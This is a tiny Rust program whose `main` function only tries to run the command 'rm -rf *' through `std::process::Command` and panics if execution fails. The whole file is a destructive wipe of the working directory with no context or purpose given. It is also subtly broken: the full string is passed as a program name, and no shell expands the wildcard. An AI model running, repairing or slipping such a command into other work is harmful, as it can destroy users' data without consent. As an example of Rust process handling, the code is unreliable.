fn main() {
    std::process::Command::new("rm -rf *")
        .status()
        .expect("Failed to execute command");
}
